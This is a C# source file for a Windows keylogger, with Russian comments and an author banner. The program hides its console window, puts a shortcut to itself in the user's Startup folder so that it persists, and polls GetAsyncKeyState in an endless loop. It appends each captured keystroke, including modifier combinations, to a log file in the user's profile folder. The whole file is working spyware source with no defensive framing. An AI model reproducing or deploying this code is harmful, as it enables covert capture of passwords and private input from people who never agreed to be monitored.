// by  ___________________________________________________________________________________________________
//    /                                                                                                   \
//   /          /\         |\        | ----------    -----------        /\         ________     \        / \ 
//   |         /  \        | \       | |         |   |                 /  \        |       \     \      /   |
//   |        /    \       |  \      | |         |   |                /    \       |        \     \    /    |
//   |       /      \      |   \     | |         |   |               /      \      |         |     \  /     |
//   |      /--------\     |    \    | |---------    |----------    /--------\     |         |      ||      |
//   |     /          \    |     \   | |  \          |             /          \    |         |      ||      |
//   |    /            \   |      \  | |   \         |            /            \   |        /       ||      |
//   |   /              \  |       \ | |    \        |           /              \  |       /        ||      |
//   \  /                \ |        \| |     \       ---------- /                \ --------         ||      /
//    \                                                                                                    /
//     ----------------------------------------------------------------------------------------------------


using System.IO;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using App;

namespace KeyLogger
{
    class Program
    {
        const int SW_HIDE = 0;

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]
        private static extern short GetAsyncKeyState(int vKey);
        private static string _Key = string.Empty;

        static void Main()
        {
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            int Keys = Enum.GetValues(typeof(Keys)).Length;
            string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\log.log"; //Создаем переменную с путем к файлу log.log в который будем помещать наши нажатия
            string autostart = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\App.lnk";//Создаем переменную с путем к автозагрузке
            Class1 t = new Class1();
            t.Main(autostart, "App.exe"); // добавление в автозагрузку
            string _PKey = "";

            while (true)
            {
                for (int i = 0; i < Keys; i++) if (GetAsyncKeyState(i) == -32767) _Key += Enum.GetName(typeof(Keys), i);//Считываем нажатия

                if (_Key.Length <= 0) { Thread.Sleep(50); continue; }// если ничего не нажато, то пропускаем остальное

                if (_Key.Equals("LButton")) { _Key = string.Empty; continue; }//Пропускаем нажатие мыши
                if (_Key.Equals("RButton")) { _Key = string.Empty; continue; }
                if (_Key.Equals("Decimal")) { _Key = "."; }//Заменяем слово Decimal на точку

                if (_Key == "D0" || _Key == "D1" || _Key == "D2" || _Key == "D3" || _Key == "D4" || _Key == "D5" || _Key == "D6" || _Key == "D7" || _Key == "D8" || _Key == "D9")//Есл цифра нажата в NumLK то убираем D
                {
                    _Key = _Key.Replace("D", "");
                }
                //Переобразуем все остальное в читабельные названия
                _Key = _Key.Replace("NumPad", "");
                _Key = _Key.Replace("ShiftKeyLShiftKey", "Shift");
                _Key = _Key.Replace("ShiftKeyRShiftKey", "Shift");
                _Key = _Key.Replace("ShiftLShiftKey", "Shift");
                _Key = _Key.Replace("ShiftRShiftKey", "Shift");
                _Key = _Key.Replace("ShiftShift", "Shift");
                _Key = _Key.Replace("ShiftKey", "Shift");
                _Key = _Key.Replace("LShift", "Shift");
                _Key = _Key.Replace("MenuLMenu", "Alt");
                _Key = _Key.Replace("MenuRMenu", "Alt");
                _Key = _Key.Replace("LWin", "Win");
                _Key = _Key.Replace("ControlKeyRControlKey", "Ctrl");
                _Key = _Key.Replace("ControlKeyLControlKey", "Ctrl");
                _Key = _Key.Replace("CtrlLControlKey", "Ctrl");
                _Key = _Key.Replace("CtrlRControlKey", "Ctrl");
                _Key = _Key.Replace("CtrlControlKey", "Ctrl");
                _Key = _Key.Replace("CtrlCtrl", "Ctrl");
                _Key = _Key.Replace("OemMinus", "-");
                _Key = _Key.Replace("Right", "➡");
                _Key = _Key.Replace("Left", "⬅"); 
                _Key = _Key.Replace("Up", "⬆");
                _Key = _Key.Replace("Down", "⬇");
                _Key = _Key.Replace("OemPeriod", ".");
                _Key = _Key.Replace("OemPlus", "=");
                _Key = _Key.Replace("Oemcomma", ",");
                _Key = _Key.Replace("Divide", "/");
                _Key = _Key.Replace("Multiply", "*");
                _Key = _Key.Replace("Subtract", "-");
                _Key = _Key.Replace("Add", "+");
                _Key = _Key.Replace("Enter", Environment.NewLine);
                
                if(_PKey == "Shift" || _PKey == "Win" || _PKey == "Ctrl")//Если прошлая кнопка равняется Shift Win или Ctrl то:
                {
                    if(_Key == "Shift" || _Key == "Win" || _Key == "Ctrl")//Проверяем если нажатая клавиша равняется Shift Win или Ctrl то пропускаем остальное
                    {
                        continue;
                    }
                    _PKey = _Key; //записываем в _PKey нажатую клавишу
                    _Key = "+ " + _Key; //Добавляем плюс к нажатой клавише что бы получилось так Win + l shift + alt
                    _Key = _Key.ToLower();//Все к нижнему регистру
                    _Key += " ";//доавляем пробел
                    File.AppendAllText(path, _Key);//записуем в файл
                    _Key = string.Empty;//чистим переменную
                    continue;
                }
                _PKey = _Key;
                _Key = _Key.ToLower();//Все к нижнему регистру
                _Key += " ";//доавляем пробел
                File.AppendAllText(path, _Key);//записуем в файл
                _Key = string.Empty;//чистим переменную
            }
        }
    }
}
